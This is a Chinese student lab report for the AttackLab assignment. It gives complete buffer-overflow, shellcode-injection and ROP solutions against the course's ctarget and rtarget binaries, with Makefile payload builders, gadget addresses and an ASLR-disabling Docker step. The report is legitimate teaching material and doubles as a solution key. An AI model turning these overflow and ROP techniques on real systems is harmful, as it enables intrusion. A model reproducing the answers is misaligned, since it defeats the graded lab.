#import "@preview/scripst:1.1.1": *

#show: scripst.with(
  template: "report",
  title: [计算机组成原理实验报告],
  info: [AttackLAB],
  author: ("Anzreww",),
  time: "2025年11月",
  contents: true,
  content-depth: 3,
  matheq-depth: 3,
  lang: "zh",
)

= 实验目的

- 掌握缓冲区溢出攻击的基本原理和方法。
- 理解栈保护机制及其绕过方法。
- 理解ROP攻击技术。
- 熟悉使用调试器和反汇编工具进行漏洞分析。
- 提高编写和调试攻击代码的能力。

= 实验环境

- 操作系统：Linux (Ubuntu 20.04 docker)

  makefile 部分代码如下：
  ```makefile
  UBUNTU_IMAGE := ubuntu:20.04
  UBUNTU_NAME := attacklab-ubuntu
  docker:
    docker run --rm -it --privileged \
      -v $(PWD):/lab -w /lab \
      $(UBUNTU_IMAGE) /bin/bash -c "\
        echo 0 > /proc/sys/kernel/randomize_va_space && \
        apt update && \
        DEBIAN_FRONTEND=noninteractive apt install -y build-essential gdb && \
        echo '>>> Environment ready! Entering shell...' && \
        bash"
  ```
  经测试，宿主机archlinux同样可以直接运行实验代码，无需docker。
- 编译器：gcc
- 调试器：gdb
- 反汇编工具：objdump

= 实验内容

所有的实验代码均在 http://github.com/An-314/Notes-of-Computer-Organization-Principle/blob/master/LAB/attacklab/target/makefile 中。

makefile 给出了下面所有实验的步骤的自动化脚本。
```makefile
CTARGET := ./ctarget
RTARGET := ./rtarget
HEX2RAW := ./hex2raw
DISASC := ctarget.d
DISASR := rtarget.d
OUT := builds
SRC := src
COOKIE := $(shell cat cookie.txt)
COOKIE_PURE := $(shell echo $(COOKIE) | sed 's/^0x//')
COOKIE_PADDED := $(shell printf "%016s" $(COOKIE_PURE) | tr ' ' '0')
COOKIE_QWORD_BYTES := $(shell \
    echo $(COOKIE_PADDED) \
    | sed 's/../& /g' \
    | awk '{ for (i=NF;i>=1;i--) printf "%s ", $$i }' \
)
COOKIE_ASCII_HEX := $(shell printf '%s\0' $(COOKIE_PURE) | xxd -p | sed 's/../& /g')

BUF_ADDR := 0x5563e958
BUF_ADDR_STR := 58 e9 63 55 00 00 00 00
TOUCH1_ADDR := 0x00000000008089d6
TOUCH1_ADDR_STR := d6 89 80 00 00 00 00 00
TOUCH2_ADDR := 0x0000000000808a04
TOUCH2_ADDR_STR := 04 8a 80 00 00 00 00 00
TOUCH3_ADDR := 0x0000000000808b1b
TOUCH3_ADDR_STR := 1b 8b 80 00 00 00 00 00

G_POP_RAX := 0x808bcc
G_POP_RAX_STR := cc 8b 80 00 00 00 00 00
G_MOV_RAX_RDI := 0x808bda
G_MOV_RAX_RDI_STR := da 8b 80 00 00 00 00 00

all: level1 level2 level3 rlevel2

disas_ctarget:
	mkdir -p $(OUT)
	objdump -M intel -d ./ctarget > $(OUT)/ctarget.d
	nm -n ./ctarget > $(OUT)/ctarget.sym

disas_rtarget:
	mkdir -p $(OUT)
	objdump -M intel -d ./rtarget > $(OUT)/rtarget.d
	nm -n ./rtarget > $(OUT)/rtarget.sym

level1: $(CTARGET) disas_ctarget
	mkdir -p $(SRC)
	rm -f $(SRC)/ctarget01.txt
	for i in `seq 24`; do \
		echo -n "41 " >> $(SRC)/ctarget01.txt; \
	done
	echo -n $(TOUCH1_ADDR_STR) >> $(SRC)/ctarget01.txt
	$(HEX2RAW) < $(SRC)/ctarget01.txt > $(OUT)/level1-raw
	$(CTARGET) < $(OUT)/level1-raw

$(OUT)/level2_payload.s: cookie.txt
	mkdir -p $(OUT)
	echo "    .text" > $@
	echo "    .globl _start" >> $@
	echo "_start:" >> $@
	echo "    movl $$ $(COOKIE), %edi" >> $@
	echo "    pushq $$ $(TOUCH2_ADDR)" >> $@
	echo "    ret" >> $@

$(OUT)/level2_payload.d: $(OUT)/level2_payload.s
	gcc -c $< -o $(OUT)/level2_payload.o
	objdump -M intel -d $(OUT)/level2_payload.o > $@

$(OUT)/level2_payload.hex: $(OUT)/level2_payload.d
	grep "^ " $< | awk '/^[[:space:]]*[0-9a-f]+:/ { \
		for (i=2; i<=NF; i++) { \
			if ($$i ~ /^[0-9a-f][0-9a-f]$$/) printf "%s ", $$i; \
			else break; \
		} \
	} END { printf "\n"; }' > $@

level2: $(OUT)/level2_payload.hex disas_ctarget
	mkdir -p $(SRC)
	tr -d '\n' < $(OUT)/level2_payload.hex > $(SRC)/ctarget02.txt
	for i in `seq 13`; do \
		printf "41 " >> $(SRC)/ctarget02.txt; \
	done
	echo -n "$(BUF_ADDR_STR) " >> $(SRC)/ctarget02.txt
	./hex2raw < $(SRC)/ctarget02.txt > $(OUT)/level2-raw.txt
	./ctarget < $(OUT)/level2-raw.txt

$(OUT)/level3_payload.s:
	mkdir -p $(OUT)
	echo "    .text" > $@
	echo "    .globl _start" >> $@
	echo "_start:" >> $@
	echo "    pushq $$ $(TOUCH3_ADDR)" >> $@
	echo "    lea 8(%rsp), %rdi" >> $@
	echo "    ret" >> $@

$(OUT)/level3_payload.d: $(OUT)/level3_payload.s
	gcc -c $< -o $(OUT)/level3_payload.o
	objdump -M intel -d $(OUT)/level3_payload.o > $@

$(OUT)/level3_payload.hex: $(OUT)/level3_payload.d
	grep "^ " $< | awk '/^[[:space:]]*[0-9a-f]+:/ { \
		for (i=2; i<=NF; i++) { \
			if ($$i ~ /^[0-9a-f][0-9a-f]$$/) printf "%s ", $$i; \
			else break; \
		} \
	} END { printf "\n"; }' > $@

level3: $(OUT)/level3_payload.hex disas_ctarget
	mkdir -p $(SRC)
	tr -d '\n' < $(OUT)/level3_payload.hex > $(SRC)/ctarget03.txt
	for i in `seq 13`; do \
		echo -n "41 " >> $(SRC)/ctarget03.txt; \
	done
	echo -n "$(BUF_ADDR_STR) " >> $(SRC)/ctarget03.txt
	echo -n "$(COOKIE_ASCII_HEX)" >> $(SRC)/ctarget03.txt
	./hex2raw < $(SRC)/ctarget03.txt > $(OUT)/level3-raw.txt
	./ctarget < $(OUT)/level3-raw.txt

rlevel2: disas_rtarget
	mkdir -p $(SRC)
	rm -f $(SRC)/rtarget02.txt
	for i in `seq 24`; do \
		echo -n "41 " >> $(SRC)/rtarget02.txt; \
	done
	echo -n $(G_POP_RAX_STR) >> $(SRC)/rtarget02.txt
	echo -n " " >> $(SRC)/rtarget02.txt
	echo -n "$(COOKIE_QWORD_BYTES)" >> $(SRC)/rtarget02.txt
	echo -n "$(G_MOV_RAX_RDI_STR) " >> $(SRC)/rtarget02.txt
	echo "$(TOUCH2_ADDR_STR)" >> $(SRC)/rtarget02.txt
	$(HEX2RAW) < $(SRC)/rtarget02.txt > $(OUT)/rtarget02-raw
	$(RTARGET) < $(OUT)/rtarget02-raw


run_c:
	$(CTARGET)

run_r:
	$(RTARGET)

clean_level1:
	rm -rf $(OUT)/level1-raw
	rm -rf $(SRC)/ctarget01.txt

clean_level2:
	rm -rf $(OUT)/level2_payload.s $(OUT)/level2_payload.o $(OUT)/level2_payload.d $(OUT)/level2_payload.hex
	rm -rf $(SRC)/ctarget02.txt

clean_level3:
	rm -rf $(OUT)/level3_payload.s $(OUT)/level3_payload.o $(OUT)/level3_payload.d $(OUT)/level3_payload.hex
	rm -rf $(SRC)/ctarget03.txt

clean_rlevel2:
	rm -rf $(SRC)/rtarget02.txt

clean:
	rm -rf $(OUT)
	rm -rf $(SRC)

UBUNTU_IMAGE := ubuntu:20.04
UBUNTU_NAME := attacklab-ubuntu

docker:
	docker run --rm -it --privileged \
		-v $(PWD):/lab -w /lab \
		$(UBUNTU_IMAGE) /bin/bash -c "\
			echo 0 > /proc/sys/kernel/randomize_va_space && \
			apt update && \
			DEBIAN_FRONTEND=noninteractive apt install -y build-essential gdb && \
			echo '>>> Environment ready! Entering shell...' && \
			bash"
```
下面我们详细分析各个实验步骤的原理和实现。

以下的讨论都隐去了COOKIE的具体值，而处理过程在makefile中均有体现。

== ctarget 程序分析

=== Level 1: 简单缓冲区溢出

Level 1 要求我们利用缓冲区溢出漏洞，覆盖返回地址，使程序跳转到 `touch1` 函数，从而通过验证。

先将 `ctarget` 进行反汇编，查看其汇编代码，得到 `getbuf` 函数的栈帧布局和 `touch1` 函数的地址。

makefile 部分代码如下：
```makefile
CTARGET := ./ctarget
DISASC := ctarget.d
OUT=builds

disas_ctarget:
	mkdir -p $(OUT)
	objdump -M intel -d ./ctarget > $(OUT)/ctarget.d
	nm -n ./ctarget > $(OUT)/ctarget.sym
```
由此可以得到 `ctarget` 的反汇编文件 `ctarget.d` 和符号表 `ctarget.sym`。

查看汇编代码找到 `getbuf` 函数以及想要跳转到的 `touch1` 函数：
```asm
00000000008089c0 <getbuf>:
  8089c0:	48 83 ec 18          	sub    rsp,0x18
  8089c4:	48 89 e7             	mov    rdi,rsp
  8089c7:	e8 94 02 00 00       	call   808c60 <Gets>
  8089cc:	b8 01 00 00 00       	mov    eax,0x1
  8089d1:	48 83 c4 18          	add    rsp,0x18
  8089d5:	c3                   	ret

00000000008089d6 <touch1>:
  8089d6:	48 83 ec 08          	sub    rsp,0x8
  8089da:	c7 05 18 3b 20 00 01 	mov    DWORD PTR [rip+0x203b18],0x1        # a0c4fc <vlevel>
  8089e1:	00 00 00
  8089e4:	48 8d 3d 20 19 00 00 	lea    rdi,[rip+0x1920]        # 80a30b <_IO_stdin_used+0x27b>
  8089eb:	e8 d0 82 bf ff       	call   400cc0 <puts@plt>
  8089f0:	bf 01 00 00 00       	mov    edi,0x1
  8089f5:	e8 dd 04 00 00       	call   808ed7 <validate>
  8089fa:	bf 00 00 00 00       	mov    edi,0x0
  8089ff:	e8 1c 84 bf ff       	call   400e20 <exit@plt>
```
- 得到 `touch1` 函数的地址为 `0x08089d6`。
- `getbuf` 函数中调用了 `Gets` 函数从标准输入读取数据到栈上，栈空间大小为 0x18 字节（24 字节）。
- 所以注入时：写入 24 个字节“垃圾”之后，接下来的 8 个字节就正好覆盖返回地址。
- 我们写24个A字符作为填充，然后写入 `touch1` 函数的地址 `0x08089d6` 作为新的返回地址。

构造攻击输入：
```txt
41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 d6 89 80 00 00 00 00 00
```
注意这是小端序存储，地址 `0x08089d6` 从低位到高位依次存储为 `d6 89 80 00 00 00 00 00`。之后将其转换为raw格式的文件进行输入即可。

```makefile
level1: $(CTARGET) disas_ctarget
	mkdir -p $(SRC)
	rm -f $(SRC)/ctarget01.txt
	for i in `seq 24`; do \
		echo -n "41 " >> $(SRC)/ctarget01.txt; \
	done
	echo -n $(TOUCH1_ADDR_STR) >> $(SRC)/ctarget01.txt
	$(HEX2RAW) < $(SRC)/ctarget01.txt > $(OUT)/level1-raw
	$(CTARGET) < $(OUT)/level1-raw
```
执行 `make level1` 即可完成 Level 1 的攻击
```txt
Cookie: 0x********
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

=== Level 2: 传递整数参数

Level 2 要求我们同样利用缓冲区溢出漏洞，覆盖返回地址，此外还要函数第 1 个参数 `%rdi` 设置为 `cookie`；然后 `ret` 到 `touch2` 的入口地址。

首先查看 `touch2` 函数的地址：
```asm
0000000000808a04 <touch2>:
  808a04:	48 83 ec 08          	sub    rsp,0x8
  808a08:	89 fa                	mov    edx,edi
  808a0a:	c7 05 e8 3a 20 00 02 	mov    DWORD PTR [rip+0x203ae8],0x2        # a0c4fc <vlevel>
  808a11:	00 00 00
  808a14:	39 3d ea 3a 20 00    	cmp    DWORD PTR [rip+0x203aea],edi        # a0c504 <cookie>
  808a1a:	74 2a                	je     808a46 <touch2+0x42>
  808a1c:	48 8d 35 35 19 00 00 	lea    rsi,[rip+0x1935]        # 80a358 <_IO_stdin_used+0x2c8>
  808a23:	bf 01 00 00 00       	mov    edi,0x1
  808a28:	b8 00 00 00 00       	mov    eax,0x0
  808a2d:	e8 ae 83 bf ff       	call   400de0 <__printf_chk@plt>
  808a32:	bf 02 00 00 00       	mov    edi,0x2
  808a37:	e8 6b 05 00 00       	call   808fa7 <fail>
  808a3c:	bf 00 00 00 00       	mov    edi,0x0
  808a41:	e8 da 83 bf ff       	call   400e20 <exit@plt>
  808a46:	48 8d 35 e3 18 00 00 	lea    rsi,[rip+0x18e3]        # 80a330 <_IO_stdin_used+0x2a0>
  808a4d:	bf 01 00 00 00       	mov    edi,0x1
  808a52:	b8 00 00 00 00       	mov    eax,0x0
  808a57:	e8 84 83 bf ff       	call   400de0 <__printf_chk@plt>
  808a5c:	bf 02 00 00 00       	mov    edi,0x2
  808a61:	e8 71 04 00 00       	call   808ed7 <validate>
  808a66:	eb d4                	jmp    808a3c <touch2+0x38>
```
得到 `touch2` 函数的地址为 `0x0808a04`。

下一步，我们需要找到 `getbuf` 函数的栈帧布局
```log
❯ gdb ./ctarget
GNU gdb (GDB) 16.3
Copyright (C) 2024 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
For help, type "help".
Reading symbols from ./ctarget...
(gdb) break getbuf
Breakpoint 1 at 0x8089c0: file buf.c, line 12.
(gdb) run
Cookie: 0x********
Breakpoint 1, getbuf () at buf.c:12
warning: 12     buf.c: 没有那个文件或目录
(gdb) ni
14      in buf.c
(gdb) ni
0x00000000008089c7      14      in buf.c
(gdb) print/x $rsp
$1 = 0x5563e958
```
这里`rsp` 的值为 `0x5563e958`，我们就得到了 `buf` 缓冲区的起始地址。

于是我们注入的内容如下：
```
[ shellcode:
  movl $cookie,%edi;
  pushq $(touch2_addr);
  ret
] + [ padding to fill buf ]
[ new return address: buf_start_addr ]
```
- 在运行到 `getbuf` 函数时，`rsp` 指向 `buf` 缓冲区的起始地址 `0x5563e958`。我们将 shellcode 写入 `buf`，然后覆盖返回地址为 `buf` 的起始地址，这样当 `getbuf` 函数返回时，就会跳转到我们注入的 shellcode 处执行。
- shellcode 的第一条指令将 `cookie` 值加载到 `%edi` 寄存器中，作为 `touch2` 函数的第 1 个参数。
- shellcode 的第二条指令将 `touch2` 函数的地址压入栈中，作为 `ret` 指令的返回地址。
- 最后一条指令 `ret` 会弹出栈顶的地址并跳转到 `touch2` 函数。

我们得到了最后的攻击输入：
```txt
[ shellcode in hex ] + [ padding ] + [ rsp address in little-endian ]
```
生成攻击输入的 makefile 代码如下：
```makefile
$(OUT)/level2_payload.s: cookie.txt
	mkdir -p $(OUT)
	echo "    .text" > $@
	echo "    .globl _start" >> $@
	echo "_start:" >> $@
	echo "    movl $$ $(COOKIE), %edi" >> $@
	echo "    pushq $$ $(TOUCH2_ADDR)" >> $@
	echo "    ret" >> $@

$(OUT)/level2_payload.d: $(OUT)/level2_payload.s
	gcc -c $< -o $(OUT)/level2_payload.o
	objdump -M intel -d $(OUT)/level2_payload.o > $@

$(OUT)/level2_payload.hex: $(OUT)/level2_payload.d
	grep "^ " $< | awk '/^[[:space:]]*[0-9a-f]+:/ { \
		for (i=2; i<=NF; i++) { \
			if ($$i ~ /^[0-9a-f][0-9a-f]$$/) printf "%s ", $$i; \
			else break; \
		} \
	} END { printf "\n"; }' > $@

level2: $(OUT)/level2_payload.hex disas_ctarget
	mkdir -p $(SRC)
	tr -d '\n' < $(OUT)/level2_payload.hex > $(SRC)/ctarget02.txt
	for i in `seq 13`; do \
		echo "41 " >> $(SRC)/ctarget02.txt; \
	done
	echo -n "$(BUF_ADDR_STR) " >> $(SRC)/ctarget02.txt
	./hex2raw < $(SRC)/ctarget02.txt > $(OUT)/level2-raw.txt
	./ctarget < $(OUT)/level2-raw.txt
```
其中编写了汇编代码
```asm
    .text
    .globl _start
_start:
    movl $<cookie>, %edi
    pushq $<touch2_addr>
    ret
```
执行 `make level2` 即可完成 Level 2 的攻击
```txt
Cookie: 0x********
Type string:Touch2!: You called touch2(0x********)
Valid solution for level 2 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

=== Level 3: 传递字符串参数

本阶段任务与level 2基本相同，但要传递的参数变为了一个字符串——也就是说，需要传递一个地址作为参数，并自己管理字符串的存储。

首先查看 `touch3` 函数的地址：
```asm
0000000000808b1b <touch3>:
  808b1b:	53                   	push   rbx
  808b1c:	48 89 fb             	mov    rbx,rdi
  808b1f:	c7 05 d3 39 20 00 03 	mov    DWORD PTR [rip+0x2039d3],0x3        # a0c4fc <vlevel>
  808b26:	00 00 00
  808b29:	48 89 fe             	mov    rsi,rdi
  808b2c:	8b 3d d2 39 20 00    	mov    edi,DWORD PTR [rip+0x2039d2]        # a0c504 <cookie>
  808b32:	e8 31 ff ff ff       	call   808a68 <hexmatch>
  808b37:	85 c0                	test   eax,eax
  808b39:	74 2d                	je     808b68 <touch3+0x4d>
  808b3b:	48 89 da             	mov    rdx,rbx
  808b3e:	48 8d 35 3b 18 00 00 	lea    rsi,[rip+0x183b]        # 80a380 <_IO_stdin_used+0x2f0>
  808b45:	bf 01 00 00 00       	mov    edi,0x1
  808b4a:	b8 00 00 00 00       	mov    eax,0x0
  808b4f:	e8 8c 82 bf ff       	call   400de0 <__printf_chk@plt>
  808b54:	bf 03 00 00 00       	mov    edi,0x3
  808b59:	e8 79 03 00 00       	call   808ed7 <validate>
  808b5e:	bf 00 00 00 00       	mov    edi,0x0
  808b63:	e8 b8 82 bf ff       	call   400e20 <exit@plt>
  808b68:	48 89 da             	mov    rdx,rbx
  808b6b:	48 8d 35 36 18 00 00 	lea    rsi,[rip+0x1836]        # 80a3a8 <_IO_stdin_used+0x318>
  808b72:	bf 01 00 00 00       	mov    edi,0x1
  808b77:	b8 00 00 00 00       	mov    eax,0x0
  808b7c:	e8 5f 82 bf ff       	call   400de0 <__printf_chk@plt>
  808b81:	bf 03 00 00 00       	mov    edi,0x3
  808b86:	e8 1c 04 00 00       	call   808fa7 <fail>
  808b8b:	eb d1                	jmp    808b5e <touch3+0x43>
```
得到 `touch3` 函数的地址为 `0x0808b1b`。

我们要写入的 shellcode 如下：
```asm
    .text
    .globl _start
_start:
    pushq $touch3_addr      # RSP -= 8; [RSP] = touch3
    lea 8(%rsp), %rdi       # RDI = RSP + 8 = &cookie_string
    ret                     # ret to touch3
```
所以我们还需要在栈上存储 `cookie` 字符串，以便传递给 `touch3` 函数。

可以将 `cookie` 字符串放在 shellcode 之后，计算其在栈上的地址，然后传递给 `touch3` 函数。
```makefile
COOKIE := $(shell cat cookie.txt)
COOKIE_PURE := $(shell echo $(COOKIE) | sed 's/^0x//')
COOKIE_ASCII_HEX := $(shell printf '%s\0' $(COOKIE_PURE) | xxd -p | sed 's/../& /g')
```
缓冲区最后如下
```
[ shellcode:
  pushq $touch3_addr
  lea 8(%rsp), %rdi
  ret
] + [ padding to fill buf ]
[ new return address: buf_start_addr ]
[ cookie string in ASCII hex ]
```
我们没有把字符串塞在 `getbuf` 的局部变量区域内，而是放在覆盖后的返回地址上方；让 `ret` 之后的 `rsp` 刚好指向字符串；再用 `lea 8(%rsp), %rdi` 利用这个相对位置；后续 `touch3/hexmatch/strncmp` 的栈帧分配都只会往更小的地址长，不会碰到高地址的字符串区域。

生成攻击输入的 makefile 代码如下：
```makefile
$(OUT)/level3_payload.s:
	mkdir -p $(OUT)
	echo "    .text" > $@
	echo "    .globl _start" >> $@
	echo "_start:" >> $@
	echo "    pushq $$ $(TOUCH3_ADDR)" >> $@
	echo "    lea 8(%rsp), %rdi" >> $@
	echo "    ret" >> $@

$(OUT)/level3_payload.d: $(OUT)/level3_payload.s
	gcc -c $< -o $(OUT)/level3_payload.o
	objdump -M intel -d $(OUT)/level3_payload.o > $@

$(OUT)/level3_payload.hex: $(OUT)/level3_payload.d
	grep "^ " $< | awk '/^[[:space:]]*[0-9a-f]+:/ { \
		for (i=2; i<=NF; i++) { \
			if ($$i ~ /^[0-9a-f][0-9a-f]$$/) printf "%s ", $$i; \
			else break; \
		} \
	} END { printf "\n"; }' > $@

level3: $(OUT)/level3_payload.hex disas_ctarget
	mkdir -p $(SRC)
	tr -d '\n' < $(OUT)/level3_payload.hex > $(SRC)/ctarget03.txt
	for i in `seq 13`; do \
		echo -n "41 " >> $(SRC)/ctarget03.txt; \
	done
	echo -n "$(BUF_ADDR_STR) " >> $(SRC)/ctarget03.txt
	echo -n "$(COOKIE_ASCII_HEX)" >> $(SRC)/ctarget03.txt
	./hex2raw < $(SRC)/ctarget03.txt > $(OUT)/level3-raw.txt
	./ctarget < $(OUT)/level3-raw.txt
```
执行 `make level3` 即可完成 Level 3 的攻击
```txt
Cookie: 0x********
Type string:Touch3!: You called touch3("********")
Valid solution for level 3 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

== rtarget 程序分析

=== Level 2: 传递整数参数

与ctarget相比，rtarget在level2中增加了对栈保护机制的使用：
- 栈地址随机化：每次运行时栈位置都不一样，不能再用固定的栈地址（像之前的 `BUF_ADDR`）。
- 栈不可执行（NX）：栈段被标记为不可执行，写进去的机器码无法当作指令执行。
需要用gadgets的方式进行攻击，利用已有代码片段完成攻击目的。

要调用
```c
touch2(cookie);
```
只要具备以下两个条件即可：
- 从栈上取一个 8 字节常数放进某个寄存器
  - 需要一个gadget：`popq %rax; ret`
- 把这个寄存器里的值搬到 `%rdi`
  - 需要一个gadget：`movq %rax, %rdi; ret`
然后再 `ret` 到 `touch2` 即可

可以构造这样的链
```
[ padding 覆盖到 saved RIP ]
[ addr_of_gadget_pop_rax ]          # ret #1 跳到这里
[ cookie_value (8 bytes) ]          # 给 pop %rax 用
[ addr_of_gadget_mov_rax_rdi ]      # ret #2 跳到这里
[ addr_of_touch2 ]                  # ret #3 最终跳进 touch2
```
执行时：
- `getbuf` 的 `ret` → 跳到 `gadget_pop_rax`
  - 执行：`popq %rax` → 从栈上读到 `cookie`
  - 再 `ret` → 跳到 `gadget_mov_rax_rdi`
- `gadget_mov_rax_rdi`：
  - 执行：`movq %rax,%rdi`
  - 再 `ret` → 跳到 `touch2`
- 进入 `touch2(cookie)`，验证通过，结束。

一样地，先对 `rtarget` 进行反汇编，找到需要的 gadget 和函数地址：
```asm
00000000008089c0 <getbuf>:
  8089c0:	48 83 ec 18          	sub    rsp,0x18
  8089c4:	48 89 e7             	mov    rdi,rsp
  8089c7:	e8 b7 03 00 00       	call   808d83 <Gets>
  8089cc:	b8 01 00 00 00       	mov    eax,0x1
  8089d1:	48 83 c4 18          	add    rsp,0x18
  8089d5:	c3                   	ret

0000000000808a04 <touch2>:
  808a04:	48 83 ec 08          	sub    rsp,0x8
  ...
```
和ctarget的一致：
- `buf` 的大小 = 0x18 = 24 字节；
- `mov rdi, rsp`
- 返回时：我们只要溢出覆盖 24 字节之后的 8 字节 `saved RIP`，即可控制 `ret` 跳去哪里。

现在我们寻找合适的 gadgets：
```asm
0000000000808bca <setval_177>:
  808bca: c7 07 58 90 90 c3   mov    DWORD PTR [rdi],0xc3909058
  808bd0: c3                  ret
```
从中间第 3 个字节（地址 `0x808bcc`）开始解码：
```
地址      字节          指令
808bcc:   58            pop   %rax
808bcd:   90            nop
808bce:   90            nop
808bcf:   c3            ret
808bd0:   c3            ret   （下一条）
```
所以从 `0x808bcc` 开始是一段 gadget。
- 指令：`pop %rax; nop; nop; ret`
- 作用：把当前栈顶的 8 字节弹进 `%rax`，然后 `ret` 跳到下一个地址。
以及
```asm
0000000000808bd8 <setval_451>:
  808bd8: c7 07 48 89 c7 c3   mov    DWORD PTR [rdi],0xc3c78948
  808bde: c3                  ret
```
从中间第 3 个字节（地址 `0x808bda`）开始解码：
```asm
地址      字节               指令
808bda:   48 89 c7           mov %rax, %rdi
808bdd:   c3                 ret
808bde:   c3                 ret
```
所以从 `0x808bda` 开始是一段 gadget。
- 指令：`mov %rax, %rdi; ret`
- 作用：把 `%rax` 的值放到 `%rdi`，然后 `ret` 跳到下一个地址。

利用这两个 gadget，我们可以构造如下的攻击输入：
```makefile
COOKIE := $(shell cat cookie.txt)
COOKIE_PURE := $(shell echo $(COOKIE) | sed 's/^0x//')
COOKIE_PADDED := $(shell printf "%016s" $(COOKIE_PURE) | tr ' ' '0')
COOKIE_QWORD_BYTES := $(shell \
    echo $(COOKIE_PADDED) \
    | sed 's/../& /g' \
    | awk '{ for (i=NF;i>=1;i--) printf "%s ", $$i }' \
)
COOKIE_ASCII_HEX := $(shell printf '%s\0' $(COOKIE_PURE) | xxd -p | sed 's/../& /g')

G_POP_RAX := 0x808bcc
G_POP_RAX_STR := cc 8b 80 00 00 00 00 00
G_MOV_RAX_RDI := 0x808bda
G_MOV_RAX_RDI_STR := da 8b 80 00 00 00 00 00

rlevel2: disas_rtarget
	mkdir -p $(SRC)
	rm -f $(SRC)/target04.txt
	for i in `seq 24`; do \
		echo -n "41 " >> $(SRC)/target04.txt; \
	done
	echo -n $(G_POP_RAX_STR) >> $(SRC)/target04.txt
	echo -n " " >> $(SRC)/target04.txt
	echo -n "$(COOKIE_QWORD_BYTES)" >> $(SRC)/target04.txt
	echo -n "$(G_MOV_RAX_RDI_STR) " >> $(SRC)/target04.txt
	echo "$(TOUCH2_ADDR_STR)" >> $(SRC)/target04.txt
	$(HEX2RAW) < $(SRC)/target04.txt > $(OUT)/rtarget02-raw
	$(RTARGET) < $(OUT)/rtarget02-raw
```
执行 `make rlevel2` 即可完成 Level 2 的攻击
```txt
Cookie: 0x********
Type string:Touch2!: You called touch2(0x********)
Valid solution for level 2 with target rtarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```
